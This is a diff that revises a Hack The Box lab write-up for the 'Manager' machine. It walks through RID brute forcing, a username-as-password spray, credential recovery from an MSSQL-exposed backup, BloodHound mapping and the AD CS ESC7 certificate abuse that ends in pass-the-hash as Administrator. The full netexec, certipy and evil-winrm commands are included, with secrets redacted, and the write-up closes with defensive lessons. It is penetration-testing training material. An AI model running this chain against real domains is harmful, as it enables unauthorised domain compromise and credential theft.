@@ -13,50 +13,70 @@ tags:
   - esc7
   - credential-spray
   - mssql
+objective: "Escalate from unauthenticated enumeration to domain compromise by recovering credentials and abusing AD CS ManageCA rights through ESC7."
+tools:
+  - nmap
+  - netexec
+  - impacket-mssqlclient
+  - bloodhound-ce-python
+  - evil-winrm
+  - certipy
+skill: "Active Directory enumeration and AD CS (ESC7) certificate-authority abuse"
+outcome: "Standard-user WinRM foothold and Administrator NT-hash recovery via ESC7, shown by a pass-the-hash Administrator session"
 ---
+
+## At a glance
+
+| Field | Value |
+|---|---|
+| Difficulty | Medium |
+| Target environment | Windows Active Directory domain; Domain Controller hosting AD CS, with MSSQL (1433), SMB (445), and WinRM (5985) |
+| Starting position | Unauthenticated network access |
+| Objective | Escalate from unauthenticated enumeration to domain compromise by recovering credentials and abusing AD CS ManageCA rights through ESC7 |
+| Outcome | Standard-user WinRM foothold and Administrator NT-hash recovery through ESC7, shown by a pass-the-hash Administrator session |
 
 ## Summary
 
-Manager is a Medium-rated Hack The Box Active Directory lab combining credential discovery with an Active Directory Certificate Services (AD CS) privilege-escalation path. RID brute forcing enumerates domain users, username-as-password spraying yields initial access, MSSQL filesystem access uncovers a legacy backup containing a second set of credentials, and the second account holds `ManageCA` rights enabling the ESC7 abuse chain — officer assignment, template enablement, failed-request issuance, certificate retrieval, and NT-hash recovery for full domain compromise. Passwords, hashes, IPs, and domain identifiers are redacted; command patterns and technique syntax are preserved.
+Manager is a Medium-rated Hack The Box Active Directory lab. RID brute forcing enumerates domain users and a username-as-password spray recovers one account; MSSQL access as that account exposes an old website backup holding a second credential; and the second account holds `ManageCA` rights over the Enterprise CA, enabling the AD CS ESC7 chain — officer assignment, template enablement, failed-request issuance, certificate retrieval, and NT-hash recovery for domain compromise. Passwords, hashes, addresses, and domain/host/CA identifiers are replaced with role-based placeholders; command and technique syntax is preserved.
+
+**Attack path:** **RID brute forcing → username-as-password spray → MSSQL backup discovery → WinRM foothold → BloodHound rights collection → AD CS ESC7 (officer assignment → template enablement → failed-request issuance → certificate retrieval) → NT-hash recovery → pass-the-hash Administrator**
 
 ## Context and Objective
 
-- **Target:** Windows domain environment with a Domain Controller, MSSQL (port 1433), SMB (port 445), WinRM (port 5985), and AD CS
-- **Starting position:** unauthenticated; no initial credential provided
-- **Objective:** Enumerate users, obtain initial credentials, escalate to domain compromise through AD CS abuse
-- **Lab context:** Hack The Box lab; all activity described was performed within the platform's isolated lab environment
+- **Target:** a Windows Active Directory domain whose Domain Controller also hosts an Enterprise CA (AD CS), alongside MSSQL (1433), SMB (445), and WinRM (5985).
+- **Starting position:** unauthenticated network access, with no credentials provided.
+- **Objective:** enumerate domain users, recover initial credentials, and escalate to domain compromise through AD CS abuse rather than a software memory-corruption or remote-code-execution flaw.
+- **Environment:** Hack The Box lab; all activity was confined to the platform's isolated lab environment.
 
 ## Approach and Evidence
 
 ### 1. Service Enumeration
 
-Observation: standard AD services plus MSSQL and WinRM. AD CS is present on the Domain Controller.
-
-Action: version/script scan of the target.
+Observation: the target exposes standard AD services plus MSSQL and WinRM, with AD CS present on the Domain Controller.
 
 ```bash
 nmap -sC -sV -p- -Pn -oA <OUT_PREFIX> <TARGET_IP> -T5
 ```
 
-Representative excerpt (truncated):
+Truncated scan output:
 
 ```text
 Domain: <DOMAIN>
 MSSQL: 1433/tcp
 SMB: 445/tcp
 WinRM: 5985/tcp
-AD CS present on dc01.<DOMAIN>
+AD CS present on <DC_HOST>
 ```
 
-Technical significance: MSSQL provides filesystem-level access when authenticated; AD CS presence on the DC is the eventual escalation surface.
+Significance: MSSQL provides filesystem-level access once authenticated, and the AD CS role on the Domain Controller is the eventual escalation surface.
 
-Result: the recorded output shows an AD domain with MSSQL, SMB, WinRM, and AD CS exposed.
+Result: an AD domain is reachable with MSSQL, SMB, WinRM, and AD CS exposed.
 
 ### 2. User Enumeration and Credential Spray
 
 Observation: null or guest SMB access is limited, but RID brute forcing recovers domain usernames.
 
-Action: enumerate users via RID brute force, then spray each username as its own password.
+Action: enumerate users by RID brute force, then spray each username as its own password.
 
 ```bash
 nxc smb <TARGET_IP> -u 'Guest' -p '' --rid-brute
@@ -68,19 +88,19 @@ Build a user list, then spray:
 nxc smb <DOMAIN> -u <USERLIST> -p <USERLIST> --no-bruteforce --continue-on-success
 ```
 
-Representative finding: one account accepts its own username as its password.
+The spray returns one valid credential pair:
 
 ```text
 <DOMAIN>\<OPERATOR_USER> : <OPERATOR_PASSWORD>
 ```
 
-Technical significance: username-as-password spraying is a low-noise technique that avoids account lockout while exposing weak credential policy. The account obtained here is the entry point.
+Significance: usernames are discoverable without credentials, and one account accepts its username as its password; this account is the entry point into the domain services.
 
-Result: the recorded output shows valid credentials for one domain account.
+Result: valid credentials for one domain account were recovered and validated through SMB authentication.
 
 ### 3. MSSQL Enumeration — Legacy Backup Discovery
 
-Observation: the initial credential authenticates to MSSQL via Windows authentication.
+Observation: the recovered credential authenticates to MSSQL through Windows authentication.
 
 Action: connect and enumerate the web root.
 
@@ -88,9 +108,13 @@ Action: connect and enumerate the web root.
 impacket-mssqlclient <DOMAIN>/<OPERATOR_USER>:<OPERATOR_PASSWORD>@<TARGET_IP> -windows-auth
 ```
 
-Representative finding: an old website backup archive is present in the web root.
+The web root contains an old website backup archive:
 
-Inside the archive, a configuration file contains a second set of credentials for a different domain account.
+```text
+website-backup-27-07-23-old.zip
+```
+
+A configuration file inside the archive holds a second credential pair for a different domain account (sanitized):
 
 ```xml
 <access-user>
@@ -99,13 +123,15 @@ Inside the archive, a configuration file contains a second set of credentials fo
 </access-user>
 ```
 
-Technical significance: MSSQL filesystem access commonly exposes legacy backups, configuration files, and credential artifacts. The backup here contained an active credential for a higher-privileged account.
+Significance: MSSQL filesystem access commonly exposes legacy backups and configuration files, and this backup embedded an active credential for a more privileged account.
 
-Result: the notes report a second credential pair recovered from the backup configuration.
+Result: a second credential pair was recovered from the backup configuration; it is validated later through WinRM.
 
-### 4. BloodHound Collection — Mapping AD CS Rights
+### 4. BloodHound Collection
 
-Action: collect domain objects and privilege edges using the second account.
+Observation: the second account's effective privileges still need mapping to find a route to the CA.
+
+Action: collect domain objects and privilege edges with BloodHound CE.
 
 ```bash
 bloodhound-ce-python \
@@ -116,29 +142,35 @@ bloodhound-ce-python \
   -gc <DC_HOST>
 ```
 
-Representative finding: the second account holds WinRM access and `ManageCA` rights over the Enterprise CA (`<CA_NAME>`). `ManageCA` permits CA officer assignment, template management, and certificate issuance.
+Significance: collecting AD objects and ACL edges as an authenticated domain user is how non-obvious rights such as certificate-authority management (`ManageCA`) rights surface, subsequently confirmed with `certipy find`; the CA relationship is what the ESC7 chain ultimately requires.
 
-Result: the recorded output shows the second account mapped to the CA with officer-level permissions.
+Result: domain objects and privilege edges were collected for the second account.
 
 ### 5. Foothold — WinRM Login
 
-Action: authenticate interactively over WinRM using the second account.
+Observation: the second account has WinRM access, and the recovered credential fits it.
+
+Action: authenticate interactively over WinRM.
 
 ```bash
 evil-winrm -i <TARGET_IP> -u '<SECOND_USER>' -p '<SECOND_PASSWORD>'
 ```
 
+Authentication returns a shell:
+
 ```text
 *Evil-WinRM* PS C:\Users\<SECOND_USER>\Desktop>
 ```
 
-Result: the notes report an interactive shell and the user flag (flag content omitted).
+Significance: this confirms the recovered credential is valid and yields interactive code execution as a domain user.
+
+Result: an interactive WinRM session as `<SECOND_USER>` was established.
 
 ### 6. AD CS ESC7 — CA Officer and Template Abuse
 
-Observation: the second account has `ManageCA` rights over the Enterprise CA. ESC7 exploits officer-level CA permissions to issue certificates for high-value accounts.
+Observation: the second account holds `ManageCA` rights over the Enterprise CA (`<CA_NAME>`), which ESC7 abuses to issue certificates for high-value accounts.
 
-Action: enumerate vulnerable certificate paths.
+Action: enumerate the vulnerable certificate path with Certipy.
 
 ```bash
 certipy find \
@@ -148,7 +180,7 @@ certipy find \
   -vulnerable -stdout -enable
 ```
 
-Representative finding: ESC7 through CA officer and template manipulation.
+The vulnerable path is ESC7 through CA officer and template manipulation.
 
 Step 1 — Add the second account as a CA officer:
 
@@ -170,7 +202,7 @@ certipy ca \
   -enable-template 'SubCA'
 ```
 
-Step 3 — Request a SubCA certificate as Administrator. The request fails, but the request ID is created:
+Step 3 — Request a SubCA certificate as Administrator; the request fails, but a request ID is created:
 
 ```bash
 certipy req \
@@ -209,50 +241,57 @@ certipy auth -pfx administrator.pfx -dc-ip <TARGET_IP>
 
 ```text
 Got hash for 'administrator@<DOMAIN>':
-<LM_HASH_REDACTED>:<NT_HASH_REDACTED>
+<LM_HASH>:<NT_HASH>
 ```
 
-Technical significance: ESC7 chains `ManageCA` rights through officer assignment, template enablement, and failed-request issuance to obtain a certificate for any account. The certificate authenticates via PKINIT and exposes the NT hash, enabling pass-the-hash without cracking.
+Significance: ESC7 chains `ManageCA` rights through officer assignment, template enablement, and failed-request issuance to obtain a certificate for any account; PKINIT authentication with that certificate exposes the account's NT hash, enabling pass-the-hash without cracking.
+
+Result: an Administrator certificate was issued and its PKINIT authentication returned the Administrator NT hash.
 
 ### 7. Full Compromise — Pass-the-Hash
 
-Action: authenticate as Administrator using the recovered hash.
+Observation: the recovered NT hash can authenticate directly, without the plaintext password.
+
+Action: authenticate as Administrator using the hash.
 
 ```bash
-evil-winrm -i <TARGET_IP> -u Administrator -H '<NT_HASH_REDACTED>'
+evil-winrm -i <TARGET_IP> -u Administrator -H '<NT_HASH>'
 ```
 
 ```text
 *Evil-WinRM* PS C:\Users\Administrator\Desktop>
 ```
 
-Result: the notes report an Administrator session and the root flag (flag content omitted).
+Significance: pass-the-hash grants administrative code execution and completes the escalation from an unauthenticated position.
+
+Result: an interactive Administrator session was established.
 
 ## Challenges and Decisions
 
 | Challenge | Decision | Rationale |
 |---|---|---|
-| No initial credential | Used RID brute force and username-as-password spray | Low-noise approach avoids lockout while exposing weak credential policy |
-| Second credential embedded in backup | Extracted from legacy XML config via MSSQL filesystem access | Old backups commonly contain active credentials; MSSQL access enabled discovery |
-| ESC7 requires multiple steps | Assigned officer → enabled template → issued failed request → retrieved certificate | Each step builds on the previous; failed-request issuance is the critical non-obvious technique |
+| Null or guest SMB access yielded limited results | Switched to RID brute forcing to enumerate usernames | RID enumeration exposed domain users that anonymous access did not |
+| The Administrator certificate request failed | Issued the failed request afterward as a CA officer, then retrieved it | A CA officer can authorize a pending request, so a failed request is not a dead end |
 
 ## Outcome
 
-The evidence establishes: RID enumeration → credential spray → MSSQL backup discovery → WinRM foothold → BloodHound AD CS mapping → ESC7 CA officer abuse → certificate retrieval → NT-hash recovery → pass-the-hash Administrator. Passwords and hashes are source-reported with values omitted. The attack chain demonstrates that CA officer rights are equivalent to domain compromise when vulnerable templates exist.
-
-**Attack chain:**
-RID enumeration → username-as-password spray → MSSQL credential discovery → WinRM foothold → AD CS ESC7 (officer assignment → template enablement → failed-request issuance → certificate retrieval) → pass-the-hash Administrator
+Authenticated user access is established by validated SMB and WinRM sessions, and administrative control is established by a pass-the-hash Administrator session against the recovered NT hash. The escalation relies on a weak credential policy, a legacy backup exposed through MSSQL filesystem access, and an over-privileged `ManageCA` right. Passwords, hashes, addresses, and domain/host/CA identifiers are omitted, and the ESC7 sub-steps for which the source captured no tool output are reported as source-recorded rather than output-verified.
 
 ## Lessons and Recommendations
 
-1. **Enforce strong credential policies.** Username-as-password spraying succeeds when accounts lack complexity requirements. Password policy enforcement and account lockout thresholds reduce spray success. (Lesson grounded in the initial spray.)
-2. **Audit MSSQL filesystem access.** Authenticated MSSQL sessions expose the underlying filesystem. Old backups and configuration files containing credentials should be removed from accessible paths. (Lesson grounded in the backup discovery.)
-3. **Restrict `ManageCA` rights.** CA officer permissions are powerful enough for full domain compromise through ESC7. Audit who holds officer rights and whether any non-admin account needs them. (Recommendation.)
-4. **Monitor certificate issuance.** Failed-then-issued request sequences are abnormal. Alert on officer-level CA operations and template enablement for sensitive templates like `SubCA`. (Recommendation.)
-5. **Remove legacy credentials from backups.** Configuration files embedded in backups are a common credential leak. Rotate credentials after any backup and audit backup contents before storage. (Lesson grounded in the XML credential discovery.)
+Every action below is a recommendation; none was validated in the lab.
+
+1. **Usernames are enumerable and reused as passwords.** Root cause: RID enumeration exposes account names, and at least one account's password equals its username. Demonstrated impact: a single low-noise spray recovered a working domain credential. *Recommendation:* enforce length and complexity policy, reject usernames and common patterns as passwords, and set lockout thresholds. *Detection:* alert on repeated authentication failures or many distinct accounts attempted from one source.
+2. **MSSQL filesystem access exposed a legacy backup with a plaintext credential.** Root cause: authenticated MSSQL access could read a web-root backup whose configuration file stored a credential in cleartext. Demonstrated impact: a more privileged account's credential was recovered without exploitation. *Recommendation:* remove secrets from backups and configuration files, restrict the database service's filesystem reach, and rotate any credential that has ever appeared in a backup. *Validation:* scan backup and export artifacts for secrets before storage.
+3. **An over-privileged `ManageCA` right enabled ESC7.** Root cause: a standard user held `ManageCA` over the Enterprise CA, permitting officer assignment and template enablement. Demonstrated impact: a certificate for the Administrator account was issued and its NT hash recovered, yielding full domain compromise. *Recommendation:* restrict CA officer and CA-manager rights to dedicated administrative accounts, and review certificate templates for sensitive enrollee permissions. *Detection:* alert on CA officer additions, template enablement, and failed-then-issued request sequences.
 
 ## References
 
-- Hack The Box machine **[Manager](https://app.hackthebox.com/machines/Manager)** (retired lab; no active-instance detail)
-- AD CS ESC7 documentation and Certipy tool documentation
-- `nxc`, `impacket-mssqlclient`, `bloodhound-ce-python`, `evil-winrm`, and `certipy` tool documentation
+- [Hack The Box — Manager](https://app.hackthebox.com/machines/Manager) (retired machine)
+- [Certipy](https://github.com/ly4k/Certipy) (AD CS enumeration and abuse, including ESC7)
+- [Certificate authority roles and officer rights — [MS-CSRA] (Microsoft Learn)](https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-csra/c6451297-197d-4b4b-b786-3f3187b67b8f) (`ManageCA`/CA officer rights model)
+- [NetExec](https://github.com/Pennyw0rth/NetExec) (SMB enumeration and credential spraying)
+- [Impacket](https://github.com/fortra/impacket) (`mssqlclient` for MSSQL access)
+- [BloodHound Community Edition](https://github.com/SpecterOps/BloodHound) (AD object and privilege-edge collection)
+- [evil-winrm](https://github.com/Hackplayers/evil-winrm) (WinRM interactive shell)
+- [Nmap Reference Guide](https://nmap.org/book/man.html)
